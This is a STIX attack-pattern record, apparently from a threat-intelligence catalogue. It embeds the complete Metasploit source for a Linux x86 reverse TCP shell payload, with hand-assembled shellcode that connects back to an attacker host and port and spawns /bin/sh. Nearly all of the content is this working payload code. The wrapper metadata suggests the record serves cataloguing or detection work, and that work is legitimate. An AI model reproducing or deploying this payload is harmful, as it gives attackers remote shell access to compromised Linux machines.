{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17d268a7-016e-4c60-8e10-3e6bc304dc88",
    "created": "2024-08-14T16:33:19.432272Z",
    "modified": "2024-08-14T16:33:19.432276Z",
    "name": "Linux Command Shell, Reverse TCP Inline",
    "description": "Connect back to attacker and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 68\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Reverse TCP Inline',\n      'Description'   => 'Connect back to attacker and spawn a command shell',\n      'Author'        => ['Ramon de C Valle', 'joev'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix\n    ))\n\n    register_options([\n      OptString.new('CMD', [ true, \"The command string to execute\", \"/bin/sh\" ])\n    ])\n  end\n\n  def generate(_opts = {})\n    # pad the shell path to a multiple of 4 with slashes\n    shell = datastore['CMD']\n    remainder = shell.bytes.length % 4\n    if remainder == 0 then remainder = 4 end\n    shell_padded = (\"/\" * (4-remainder)) + shell\n\n    \"\\x31\\xdb\"             + #   xor ebx,ebx\n    \"\\xf7\\xe3\"             + #   mul ebx\n    \"\\x53\"                 + #   push ebx\n    \"\\x43\"                 + #   inc ebx\n    \"\\x53\"                 + #   push ebx\n    \"\\x6a\\x02\"             + #   push byte +0x2\n    \"\\x89\\xe1\"             + #   mov ecx,esp\n    \"\\xb0\\x66\"             + #   mov al,0x66 (sys_socketcall)\n    \"\\xcd\\x80\"             + #   int 0x80\n    \"\\x93\"                 + #   xchg eax,ebx\n    \"\\x59\"                 + #   pop ecx\n    \"\\xb0\\x3f\"             + #   mov al,0x3f (sys_dup2)\n    \"\\xcd\\x80\"             + #   int 0x80\n    \"\\x49\"                 + #   dec ecx\n    \"\\x79\\xf9\"             + #   jns 0x11\n    \"\\x68\" + [IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i].pack('N') + #   push ip addr\n    \"\\x68\\x02\\x00\" + [datastore['LPORT'].to_i].pack('S>') + #   push port\n    \"\\x89\\xe1\"             + #   mov ecx,esp\n    \"\\xb0\\x66\"             + #   mov al,0x66 (sys_socketcall)\n    \"\\x50\"                 + #   push eax\n    \"\\x51\"                 + #   push ecx\n    \"\\x53\"                 + #   push ebx\n    \"\\xb3\\x03\"             + #   mov bl,0x3\n    \"\\x89\\xe1\"             + #   mov ecx,esp\n    \"\\xcd\\x80\"             + #   int 0x80\n    \"\\x52\"                 + #   push edx\n\n    # Split shellname into 4-byte words and push them one-by-one\n    # on to the stack\n    shell_padded.bytes.reverse.each_slice(4).map do |word|\n      \"\\x68\" + word.reverse.pack('C*')\n    end.join +\n\n    \"\\x89\\xe3\"             + #   mov ebx,esp\n    \"\\x52\"                 + #   push edx\n    \"\\x53\"                 + #   push ebx\n    \"\\x89\\xe1\"             + #   mov ecx,esp\n    \"\\xb0\\x0b\"             + #   mov al,0xb (execve)\n    \"\\xcd\\x80\"              #   int 0x80\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}